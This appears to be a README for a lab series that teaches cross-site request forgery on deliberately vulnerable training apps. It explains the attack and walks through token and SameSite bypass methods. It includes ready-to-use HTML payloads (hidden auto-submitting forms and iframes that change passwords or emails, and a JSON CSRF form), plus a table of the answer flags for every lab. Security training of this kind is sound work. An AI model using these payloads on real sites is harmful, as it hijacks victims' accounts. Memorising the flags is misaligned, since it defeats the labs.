# Cross-Site Request Forgery (CSRF) Labs

Master CSRF attacks from basic form submissions to advanced token bypass and SameSite cookie exploitation.

## What is CSRF?

Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to perform unwanted actions on a web application. When a victim visits a malicious page, their browser automatically includes session cookies, causing unintended actions on the target site.

CSRF attacks can:
- Change user passwords or email addresses
- Transfer funds in banking applications
- Modify account settings
- Post content as the victim
- Purchase items
- Delete accounts or data

## How CSRF Works

### Attack Flow

1. **User authenticates** to vulnerable site (receives session cookie)
2. **User visits malicious page** (while still logged in)
3. **Malicious page sends request** to vulnerable site
4. **Browser includes cookies** automatically
5. **Server processes request** as if user initiated it

### Prerequisites for CSRF

1. Relevant action (state-changing operation)
2. Cookie-based session handling
3. No unpredictable request parameters
4. Predictable request format

## Types of CSRF Attacks

### 1. GET-Based CSRF
Attack via image tags, links, or iframes

```html
<img src="http://bank.com/transfer?to=attacker&amount=1000">
```

### 2. POST-Based CSRF
Attack via auto-submitting forms

```html
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

### 3. JSON-Based CSRF
Exploiting APIs that accept JSON

```html
<form action="http://api.target.com/endpoint" method="POST" enctype="text/plain">
  <input name='{"user":"admin","action":"delete","ignore":"' value='"}'>
</form>
```

## Lab Series

### Lab 1: Basic GET CSRF
**Difficulty:** Beginner | **Duration:** 30 min | **Target:** DVWA

Learn the fundamentals:
- Understanding CSRF mechanics
- Crafting malicious URLs
- Image tag exploitation
- Link-based attacks

### Lab 2: POST-Based CSRF
**Difficulty:** Beginner | **Duration:** 30 min | **Target:** DVWA

Form-based attacks:
- Hidden form fields
- Auto-submitting forms
- iframe exploitation
- Social engineering

### Lab 3: Token Bypass Techniques
**Difficulty:** Intermediate | **Duration:** 1 hr | **Target:** bWAPP

Defeating CSRF protections:
- Token removal
- Token from another session
- Weak token analysis
- Token leakage

### Lab 4: SameSite Cookie Bypass
**Difficulty:** Advanced | **Duration:** 45 min | **Target:** Multiple

Modern browser protections:
- SameSite=Lax bypass via GET
- Top-level navigation exploitation
- Subdomain attacks

### Lab 5: JSON CSRF
**Difficulty:** Advanced | **Duration:** 1 hr | **Target:** Juice Shop

API-based attacks:
- Content-Type restrictions
- Flash-based exploitation (legacy)
- CORS misconfigurations

### Lab 6: Login CSRF
**Difficulty:** Intermediate | **Duration:** 30 min | **Target:** WebGoat

Login page attacks:
- Forcing attacker credentials
- Account linkage attacks
- Session fixation via CSRF

## Basic CSRF Payloads

### GET Request

```html
<!-- Image tag -->
<img src="http://target.com/change-email?email=attacker@evil.com" width="0" height="0">

<!-- Link -->
<a href="http://target.com/change-email?email=attacker@evil.com">Click for prize!</a>

<!-- Iframe -->
<iframe src="http://target.com/change-email?email=attacker@evil.com" style="display:none"></iframe>
```

### POST Request

```html
<form action="http://target.com/change-password" method="POST" id="csrf">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### With iframe (Silent)

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="http://target.com/change-password" method="POST" target="csrf-frame" id="csrf">
  <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>
```

## CSRF Token Bypass Techniques

### Token Removal
Simply remove the token parameter and see if the request is processed.

### Empty Token
Send an empty token value.

### Token from Another User
Use your own valid token for another user's request.

### Token Prediction
Analyze token patterns for predictability.

### Token Leakage
- Check referrer header exposure
- Look for tokens in URL parameters
- Check for XSS to steal tokens

## Tools

```bash
# Burp Suite - CSRF PoC Generator
# Right-click request > Engagement tools > Generate CSRF PoC

# Manual HTML page creation
# Create HTML file with malicious form

# XSS Hunter - Combined XSS+CSRF payloads
```

## Defense Techniques (Know Your Enemy)

Understanding defenses helps identify weaknesses:

1. **CSRF Tokens** - Random, unpredictable tokens in forms
2. **SameSite Cookies** - Restrict cookie sending to same-site
3. **Custom Headers** - Require custom header (only works with JS)
4. **Referer/Origin Validation** - Check request origin
5. **Re-authentication** - Require password for sensitive actions

## Flags

| Lab | Flag |
|-----|------|
| Lab 1 - GET CSRF | `FLAG{g3t_csrf_b4s1c}` |
| Lab 2 - POST CSRF | `FLAG{p0st_csrf_f0rm}` |
| Lab 3 - Token Bypass | `FLAG{t0k3n_byp4ss_pwn}` |
| Lab 4 - SameSite Bypass | `FLAG{s4m3s1t3_byp4ss}` |
| Lab 5 - JSON CSRF | `FLAG{js0n_csrf_4p1}` |
| Lab 6 - Login CSRF | `FLAG{l0g1n_csrf_4tt4ck}` |

## OWASP References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Attack](https://owasp.org/www-community/attacks/csrf)
- [OWASP Testing for CSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)

## Additional Resources

- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [PayloadsAllTheThings CSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)
- [HackTricks CSRF](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)
